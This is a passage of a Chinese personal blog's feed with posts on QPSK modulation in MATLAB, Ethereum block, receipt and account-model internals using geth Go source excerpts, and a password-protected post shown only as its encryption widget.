class="hljs-number">1</span>)==<span class="hljs-number">-1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">1</span>);<br><br>xinzuotu(a2)=<span class="hljs-number">-1</span>+<span class="hljs-number">1</span><span class="hljs-built_in">i</span>;<br><br>[a3,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">-1</span>);<br><br>xinzuotu(a3)=<span class="hljs-number">1</span><span class="hljs-number">-1</span><span class="hljs-built_in">i</span>;<br><br>[a4,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">1</span>);<br><br>xinzuotu(a4)=<span class="hljs-number">1</span>+<span class="hljs-number">1</span><span class="hljs-built_in">i</span>;<br><br>scatterplot(xinzuotu)  <span class="hljs-comment">% 以散点图的形式画出星座图</span><br><br>axis([<span class="hljs-number">-2</span> <span class="hljs-number">2</span> <span class="hljs-number">-2</span> <span class="hljs-number">2</span>])<br><br>title(<span class="hljs-string">&#x27;理想情况基带发射星座图&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>基带时域波形图<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619532285576-543a9c5b-1af1-4ea9-b727-448004112ae6.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u6306bebc&name=image.png&originHeight=200&originWidth=754&originalType=binary&size=34568&status=done&style=none&taskId=ude058ecc-602d-4822-b0c1-20e41b84afa&width=699" alt="image.png"><br>QPSK 调制信号波形图<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619532296410-55aeff5a-5146-4056-bbeb-42c69a047323.png#clientId=u6d886849-8a59-4&from=paste&height=191&id=u18365c2d&name=image.png&originHeight=210&originWidth=746&originalType=binary&size=128005&status=done&style=none&taskId=u5c2a400b-5220-4dcd-ad80-60844de7555&width=679" alt="image.png"><br>QPSK 调制信号功率谱图<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619532301632-4124ce79-85b6-4fe0-a12c-23243d125ad1.png#clientId=u6d886849-8a59-4&from=paste&height=332&id=uc862d20b&name=image.png&originHeight=332&originWidth=441&originalType=binary&size=51742&status=done&style=none&taskId=u90871b21-cec3-43ae-961b-35634aecd9e&width=441" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链底层-区块与交易</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="全局结构"><a href="#全局结构" class="headerlink" title="全局结构"></a>全局结构</h1><p>下图是以太坊区块数据结构与关系。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619249868318-33cdb077-0bd2-4d1e-bec1-3795eddef39c.png#clientId=u9ae9216b-af72-4&from=paste&height=402&id=u321a8f97&originHeight=644&originWidth=1228&originalType=url&status=done&style=none&taskId=u9f6b4a08-53f6-466b-bd87-bb0cb52dc50&width=766"><br>区块分为两部分：区块头(Header)和区块体(Body)。区块头信息量非常丰富，不但和上一个单元建立联系还记录了一些交易执行情况信息和矿工工作信息。</p><h1 id="定义代码"><a href="#定义代码" class="headerlink" title="定义代码"></a>定义代码</h1><p>下面是以太坊代码中定义的区块头和区块体结构定义代码，所有核心代码均在 core/types/block.go 文件中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/block.go:70</span><br><span class="hljs-keyword">type</span> Header <span class="hljs-keyword">struct</span> &#123;<br>   ParentHash  common.Hash    <span class="hljs-string">`json:&quot;parentHash&quot;       gencodec:&quot;required&quot;`</span><br>   UncleHash   common.Hash    <span class="hljs-string">`json:&quot;sha3Uncles&quot;       gencodec:&quot;required&quot;`</span><br>   Coinbase    common.Address <span class="hljs-string">`json:&quot;miner&quot;            gencodec:&quot;required&quot;`</span><br>   Root        common.Hash    <span class="hljs-string">`json:&quot;stateRoot&quot;        gencodec:&quot;required&quot;`</span><br>   TxHash      common.Hash    <span class="hljs-string">`json:&quot;transactionsRoot&quot; gencodec:&quot;required&quot;`</span><br>   ReceiptHash common.Hash    <span class="hljs-string">`json:&quot;receiptsRoot&quot;     gencodec:&quot;required&quot;`</span><br>   Bloom       Bloom          <span class="hljs-string">`json:&quot;logsBloom&quot;        gencodec:&quot;required&quot;`</span><br>   Difficulty  *big.Int       <span class="hljs-string">`json:&quot;difficulty&quot;       gencodec:&quot;required&quot;`</span><br>   Number      *big.Int       <span class="hljs-string">`json:&quot;number&quot;           gencodec:&quot;required&quot;`</span><br>   GasLimit    <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;gasLimit&quot;         gencodec:&quot;required&quot;`</span><br>   GasUsed     <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;gasUsed&quot;          gencodec:&quot;required&quot;`</span><br>   Time        <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;timestamp&quot;        gencodec:&quot;required&quot;`</span><br>   Extra       []<span class="hljs-keyword">byte</span>         <span class="hljs-string">`json:&quot;extraData&quot;        gencodec:&quot;required&quot;`</span><br>   MixDigest   common.Hash    <span class="hljs-string">`json:&quot;mixHash&quot;`</span><br>   Nonce       BlockNonce     <span class="hljs-string">`json:&quot;nonce&quot;`</span><br>&#125;<br><span class="hljs-keyword">type</span> Body <span class="hljs-keyword">struct</span> &#123;<br>Transactions []*Transaction<br>Uncles       []*Header<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h3 id="parentHash"><a href="#parentHash" class="headerlink" title="parentHash"></a>parentHash</h3><p>是一个哈希值，记录此区块直接引用的父区块哈希值。通过此记录，才能完整的将区块有序组织，形成一条区块链。并且可以防止父区块内容被修改，因为数据修改，区块哈希必然发生变化，因此一个区块直接或间接的强化了所有父辈区块，通过加密算法保证历史区块不可能被修改。</p><h3 id="miner"><a href="#miner" class="headerlink" title="miner"></a>miner</h3><p>是一个地址，表示区块是此账户的矿工挖出，挖矿奖励将下发到此账户。</p><h3 id="transactionsRoot"><a href="#transactionsRoot" class="headerlink" title="transactionsRoot"></a>transactionsRoot</h3><p>是一个哈希值，表示该区块中所有交易生成一颗默克尔树根节点哈希值。是一个密码学保证交易集合摘要。通过此 Root 可以直接校验某交易是否包含在此区块中。</p><h3 id="mixHash"><a href="#mixHash" class="headerlink" title="mixHash"></a>mixHash</h3><p>是一个哈希值。用于校验区块是否正确挖出。实际上是区块头数据不包含 nonce 时的一个哈希值。</p><h1 id="区块体"><a href="#区块体" class="headerlink" title="区块体"></a>区块体</h1><p>区块体 Body 中只有两项数据：<a href="https://learnblockchain.cn/books/geth/part1/transaction.html">交易</a>集合和叔辈区块头集合。是交易促使以太坊世界态进行转变。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619253706498-09b2bbc1-7c6d-4e9d-baeb-660898a5cdca.png#clientId=u9ae9216b-af72-4&from=paste&height=203&id=u42b0fbbe&originHeight=283&originWidth=969&originalType=url&status=done&style=none&taskId=u56a01b4b-366c-4bd6-976c-05606cea4e0&width=693.5"><br>从创世状态开始，每一个区块中的交易执行促使了以太坊世界态的转变。下一个状态是在上一个状态中执行交易或其他操作使得状态由 A 状态转变为 B 状态。<br>而交易则为状态转变的催化酶，<strong>一个区块中的所有交易执行完成后，将使得以太坊进入一个新的状态。</strong>状态转变过程中记录了一些起始变量和结果数据，分别是交易默克尔哈希值<strong>transactionsRoot</strong>、交易回执默克尔哈希值** receiptRoot<strong>、事件布隆值</strong>logsBloom<strong>、新状态的默克尔哈希值</strong>stateRoot**。</p><h1 id="交易回执"><a href="#交易回执" class="headerlink" title="交易回执"></a>交易回执</h1><p>在以太坊中一份交易回执记录了关于此笔交易的处理结果信息：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619265537072-fa82f8b8-40cd-4e53-9d2c-59fb05fc38cb.png#clientId=u9ae9216b-af72-4&from=paste&height=380&id=u3f9ff1a7&originHeight=760&originWidth=652&originalType=url&status=done&style=none&taskId=u8eec5c7d-8f2e-41d5-9917-91e25564eb4&width=326"><br>回执信息分为三部分：共识信息、交易信息、区块信息。下面分别介绍各类信息。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619265548117-1b30757f-4e93-46f6-ac94-0195ecb1f716.png#clientId=u9ae9216b-af72-4&from=paste&height=359&id=u9d6c0d41&originHeight=718&originWidth=642&originalType=url&status=done&style=none&taskId=u780e7386-1eaa-45c3-a6fc-2cdef063091&width=321"></p><h2 id="交易回执共识信息"><a href="#交易回执共识信息" class="headerlink" title="交易回执共识信息"></a>交易回执共识信息</h2><p>共识意味在在校验区块合法性时，这部分信息也参与校验。这些信息参与校验的原因是确保交易必须在区块中的固定顺序中执行，且记录了交易执行后的状态信息。这样可强化交易顺序。</p><ul><li>Status： 成功与否，1 表示成功，0 表示失败。</li><li>CumulativeGasUsed： 区块中已执行的交易累计消耗的 Gas，包含当前交易。</li><li>Logs: 当前交易执行所产生的智能合约事件列表。</li><li>Bloom：是从 Logs 中提取的事件布隆过滤器，用于快速检测某主题的事件是否存在于 Logs 中。</li></ul><p><strong>如何参与共识校验呢</strong>？<br>实际上<strong>参与校验</strong>的<strong>仅仅是回执哈希</strong>，而<strong>回执哈希</strong>计算<strong>只包含这些信息</strong>。<br>首先，在校验时获取整个区块回执信息的默克尔树的根哈希值。再判断此哈希值是否同区块头定义内容相同。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/block_validator.go:92</span><br>receiptSha := types.DeriveSha(receipts)<br><span class="hljs-keyword">if</span> receiptSha != header.ReceiptHash &#123;<br>   <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid receipt root hash (remote: %x local: %x)&quot;</span>,<br>   header.ReceiptHash, receiptSha)<br>&#125;<br></code></pre></td></tr></table></figure><p>而函数 types.DeriveSha 中<strong>生成根哈希值</strong>，是将列表元素（这里是<strong>交易回执</strong>）的<strong>RLP 编码信息</strong>构成<strong>默克树</strong>，最终获得列表的哈希值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/derive_sha.go:32</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DeriveSha</span><span class="hljs-params">(list DerivableList)</span> <span class="hljs-title">common</span>.<span class="hljs-title">Hash</span></span> &#123;<br>   keybuf := <span class="hljs-built_in">new</span>(bytes.Buffer)<br>   trie := <span class="hljs-built_in">new</span>(trie.Trie)<br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; list.Len(); i++ &#123;<br>      keybuf.Reset()<br>      rlp.Encode(keybuf, <span class="hljs-keyword">uint</span>(i))<br>      trie.Update(keybuf.Bytes(), list.GetRlp(i))<br>   &#125;<br>   <span class="hljs-keyword">return</span> trie.Hash()<br>&#125;<br><span class="hljs-comment">// core/types/receipt.go:237</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r Receipts)</span> <span class="hljs-title">GetRlp</span><span class="hljs-params">(i <span class="hljs-keyword">int</span>)</span> []<span class="hljs-title">byte</span></span> &#123;<br>   bytes, err := rlp.EncodeToBytes(r[i])<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-built_in">panic</span>(err)<br>   &#125;<br>   <span class="hljs-keyword">return</span> bytes<br>&#125;<br></code></pre></td></tr></table></figure><p>继续往下看，交易回执实现了 RLP 编码接口。在方法 EncodeRLP 中是构建了一个私有的 receiptRLP。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:119</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Receipt)</span> <span class="hljs-title">EncodeRLP</span><span class="hljs-params">(w io.Writer)</span> <span class="hljs-title">error</span></span> &#123;<br><span class="hljs-keyword">return</span> rlp.Encode(w,<br>&amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>从代码中可以看出 receiptRLP 仅仅包含上面提到的参与共识校验的内容。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:78</span><br><span class="hljs-keyword">type</span> receiptRLP <span class="hljs-keyword">struct</span> &#123;<br>   PostStateOrStatus []<span class="hljs-keyword">byte</span><br>   CumulativeGasUsed <span class="hljs-keyword">uint64</span><br>   Bloom             Bloom<br>   Logs              []*Log<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="交易回执交易信息"><a href="#交易回执交易信息" class="headerlink" title="交易回执交易信息"></a>交易回执交易信息</h2><p>这部分信息记录的是关于回执所对应的交易信息，有：</p><ul><li>TxHash ： 交易回执所对应的交易哈希。</li><li>ContractAddress： 当这笔交易是部署新合约时，记录新合约的地址。</li><li>GasUsed: 这笔交易执行所消耗的<a href="https://learnblockchain.cn/books/geth/part1/gas.html">Gas 燃料</a>。</li></ul><p>这些信息不参与共识的原因是这三项信息已经在其他地方校验。</p><ul><li>TxHash: 区块有校验交易集的正确性。</li><li>ContractAddress： 如果是新合约，实际上已经提交到以太坊状态 State 中。</li><li>GasUsed： 已属于 CumulativeGasUsed 的一部分。</li></ul><h2 id="交易回执区块信息"><a href="#交易回执区块信息" class="headerlink" title="交易回执区块信息"></a>交易回执区块信息</h2><p>这部分信息完全是<strong>为了方便外部读取交易回执</strong>，不但知道交易执行情况，<strong>还能方便的指定该交易属于哪个区块中第几笔交易</strong>。</p><ul><li>BlockHash: <strong>交易所在区块哈希</strong>。</li><li>BlockNumber: <strong>交易所在区块高度</strong>。</li><li>TransactionIndex：<strong>交易在区块中的序号</strong>。</li></ul><p>这三项信息，主要是<strong>在数据库 Leveldb 中读取交易回执</strong>时，<strong>实时指定</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:315</span><br>receipts := <span class="hljs-built_in">make</span>(types.Receipts, <span class="hljs-built_in">len</span>(storageReceipts))<br>logIndex := <span class="hljs-keyword">uint</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i, receipt := <span class="hljs-keyword">range</span> storageReceipts &#123;<br>   <span class="hljs-comment">//...</span><br>   receipts[i] = (*types.Receipt)(receipt)<br>   receipts[i].BlockHash = hash<br>   receipts[i].BlockNumber = big.NewInt(<span class="hljs-number">0</span>).SetUint64(number)<br>   receipts[i].TransactionIndex = <span class="hljs-keyword">uint</span>(i)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="交易回执存储"><a href="#交易回执存储" class="headerlink" title="交易回执存储"></a>交易回执存储</h2><p><strong>交易回执</strong>作为<strong>交易执行中间产物</strong>，为了方便快速获取某笔交易的执行明细。以太坊中有跟随区块存储时实时存储交易回执。但为了降低存储量，只存储了必要内容。<br>首先，在<strong>存储</strong>时，将交易回执对象转换为<strong>精简内容</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:338</span><br>storageReceipts := <span class="hljs-built_in">make</span>([]*types.ReceiptForStorage, <span class="hljs-built_in">len</span>(receipts))<br><span class="hljs-keyword">for</span> i, receipt := <span class="hljs-keyword">range</span> receipts &#123;<br>   storageReceipts[i] = (*types.ReceiptForStorage)(receipt)<br>&#125;<br></code></pre></td></tr></table></figure><p>精简内容是专门为存储定义的一个结构 ReceiptForStorage。存储时将交易回执集进行 RLP 编码存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:342</span><br>bytes, err := rlp.EncodeToBytes(storageReceipts)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   log.Crit(<span class="hljs-string">&quot;Failed to encode block receipts&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := db.Put(blockReceiptsKey(number, hash), bytes); err != <span class="hljs-literal">nil</span> &#123;<br>   log.Crit(<span class="hljs-string">&quot;Failed to store block receipts&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以看存储了哪些内容，只需要看 ReceiptForStorage 的 EncodeRLP 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:179</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *ReceiptForStorage)</span> <span class="hljs-title">EncodeRLP</span><span class="hljs-params">(w io.Writer)</span> <span class="hljs-title">error</span></span> &#123;<br>   enc := &amp;receiptStorageRLP&#123;<br>      PostStateOrStatus: (*Receipt)(r).statusEncoding(),<br>      CumulativeGasUsed: r.CumulativeGasUsed,<br>      TxHash:            r.TxHash,<br>      ContractAddress:   r.ContractAddress,<br>      Logs:              <span class="hljs-built_in">make</span>([]*LogForStorage, <span class="hljs-built_in">len</span>(r.Logs)),<br>      GasUsed:           r.GasUsed,<br>   &#125;<br>   <span class="hljs-keyword">for</span> i, log := <span class="hljs-keyword">range</span> r.Logs &#123;<br>      enc.Logs[i] = (*LogForStorage)(log)<br>   &#125;<br>   <span class="hljs-keyword">return</span> rlp.Encode(w, enc)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619355807814-5098a5b6-b3eb-40aa-8d94-a034d3740090.png#clientId=u9ae9216b-af72-4&from=paste&height=482&id=u14eddb16&originHeight=746&originWidth=854&originalType=url&status=done&style=none&taskId=ubb7522ff-0229-47a2-8673-79e407e628c&width=552"></p><h1 id="交易回执示例–文档参考"><a href="#交易回执示例–文档参考" class="headerlink" title="交易回执示例–文档参考"></a>交易回执示例–文档参考</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619356560023-33cc24cb-d709-4b5c-b571-ad553c03a486.png#clientId=u9ae9216b-af72-4&from=paste&height=737&id=u301c1b6f&originHeight=1474&originWidth=1664&originalType=url&status=done&style=none&taskId=u1730403f-a93e-4126-920d-39990df7fdc&width=832"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流量在线识别系统demo</title>
      <link href="/2021/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo/"/>
      <url>/2021/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9f8657519d74e1b886ad6e06860750a6ef7b16364a43fc09946108b28949d471"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链底层-账户模型</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>我们采用和以太坊相似的账户模型。</p><a id="more"></a><h1 id="账户数据结构"><a href="#账户数据结构" class="headerlink" title="账户数据结构"></a>账户数据结构</h1><p>以太坊数据以账户为单位组织，账户数据的变更引起账户状态变化, 从而引起以太坊状态变化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/state_object.go:100</span><br><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;<br>    Nonce    <span class="hljs-keyword">uint64</span><br>    Balance  *big.Int<br>    Root     common.Hash<br>    CodeHash []<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在密码学领域，Nonce 代表一个只使用一次的数字。它往往是一个随机或伪随机数，以避免重复。 以太坊账户中加入 Nonce，可避免重放攻击（不过不是随机产生）。账户 Nonce 起始值是 0，后续每触发一次账户执行则 Nonce 值计加一次。 其中一处的计数逻辑如下：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state_transition.go:212</span><br>st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>Balance 则记录该账户所拥有的以太（ETH）数量，称为账户余额.</li></ul><p>当然必须保证转账方余额充足，在转移前需要 CanTransfer 检查， 如果余额充足，则执行 Transfer 转移 Value 数量的以太。</p><ul><li>账户状态哈希值 StateRoot，是一颗默克尔压缩前缀树（Merkle Patricia Tree）的根值。可以直接利用 StateRoot 从 Leveldb 中快速读取具体的某个状态数据</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619187341401-ce4d1b34-e648-4a85-86fb-617d1b2096b8.png#clientId=u7a530312-f976-4&from=paste&height=318&id=uadb7d967&originHeight=1006&originWidth=1062&originalType=url&status=done&style=none&taskId=u8125fdd8-2c02-4142-8ff6-2a5b708f249&width=336"><br>上图是以太坊账户数据存储结构，账户内部实际只存储关键数据，而合约代码以及合约自身数据则通过对应的哈希值关联。 因为每个账户对象，将作为一个以太坊账户树的一个叶子数据存储， 不能太大。<br>从以太坊作为一个世界态(World State)状态机视角看数据关系如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619187528845-a6a7b2a0-4445-4bd7-839d-ed7715755f7c.png#clientId=u7a530312-f976-4&from=paste&height=125&id=ud8337454&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=u96e7177e-6233-4ade-8cc1-94578d56711&width=686.5"><br>我们通过一段示例代码，感受下以太坊账户数据存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span>(...)<br><span class="hljs-keyword">var</span> toAddr =common.HexToAddress<br><span class="hljs-keyword">var</span> toHash =common.BytesToHash<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;<br>    statadb, _ := state.New(common.Hash&#123;&#125;,<br>        state.NewDatabase(rawdb.NewMemoryDatabase()))<span class="hljs-comment">// ❶</span><br><br>    acct1:=toAddr(<span class="hljs-string">&quot;0x0bB141C2F7d4d12B1D27E62F86254e6ccEd5FF9a&quot;</span>)<span class="hljs-comment">// ❷</span><br>    acct2:=toAddr(<span class="hljs-string">&quot;0x77de172A492C40217e48Ebb7EEFf9b2d7dF8151B&quot;</span>)<br><br>    statadb.AddBalance(acct1,big.NewInt(<span class="hljs-number">100</span>))<br>    statadb.AddBalance(acct2,big.NewInt(<span class="hljs-number">888</span>))<br><br>    contract:=crypto.CreateAddress(acct1,statadb.GetNonce(acct1))<span class="hljs-comment">// ❸</span><br>    statadb.CreateAccount(contract)<br>    statadb.SetCode(contract,[]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;contract code bytes&quot;</span>))<span class="hljs-comment">// ❹</span><br><br>    statadb.SetNonce(contract,<span class="hljs-number">1</span>)<br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;owner&quot;</span>)),toHash(acct1.Bytes()))<span class="hljs-comment">//❺</span><br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;name&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;ysqi&quot;</span>)))<br><br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;online&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">1</span>&#125;)<br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;online&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>&#123;&#125;))<span class="hljs-comment">//❻</span><br><br>    statadb.Commit(<span class="hljs-literal">true</span>)<span class="hljs-comment">// ❼</span><br>    fmt.Println(<span class="hljs-keyword">string</span>(statadb.Dump()))<span class="hljs-comment">// ❽</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，我们创建了三个账户，并且提交到数据库中。最终打印出当前数据中所有账户的数据信息：</p><ul><li>❶ 一行代码涉及多个操作。首先是<strong>创建一个内存 KV 数据库</strong>，再<strong>包装为 stata 数据库实例</strong>， 最后<strong>利用一个空的 DB 级的 StateRoot，初始化一个以太坊 statadb</strong>。</li><li>❷ 定义两个账户 acct1 和 acct2，并分别添加 100 和 888 到账户余额。</li><li>❸ 模拟合约账户的创建过程，由外部账户 acct1 创建合约账户地址，并将此地址载入 statadb。</li><li>❹ 在将合约代码加入刚刚创建的合约账户中，在写入合约代码的同时， 会利用 crypto.Keccak256Hash(code)计算合约代码哈希，保留在账户数据中。</li><li>❺ 模拟合约执行过程，涉及修改合约状态，新增三项状态数据 owner,name 和 online，分别对应不同值。</li><li>❻ 这里和前面不同的是，是给状态 online 赋值为空[]byte{}，因为所有状态的默认值均是[]byte{}， 在提交到数据库时，如 Leveldb 认为这些状态无有效值，会从数据库文件中删除此记录。 因此，此操作实际是一个删除状态 online 操作。</li><li>❼ 上面所有操作，还都<strong>只是发生在 statdb 